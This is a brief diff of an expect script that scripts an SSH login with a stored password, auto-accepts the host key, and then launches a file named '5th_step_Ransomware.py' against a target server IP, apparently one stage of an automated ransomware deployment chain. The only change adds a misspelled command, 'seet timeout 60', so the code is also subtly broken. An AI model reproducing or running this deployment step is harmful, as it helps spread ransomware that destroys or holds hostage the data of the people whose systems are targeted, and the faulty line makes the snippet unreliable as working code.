@@ -16,7 +16,7 @@ expect "*continue connecting (yes/no*)? "
 send "yes\r"
 expect " password: "
 send "$password\r"
-
+seet timeout 60
 
 expect "*:~# "
 send "python3 $path/5th_step_Ransomware.py $path $ip $target_server_ip\r"
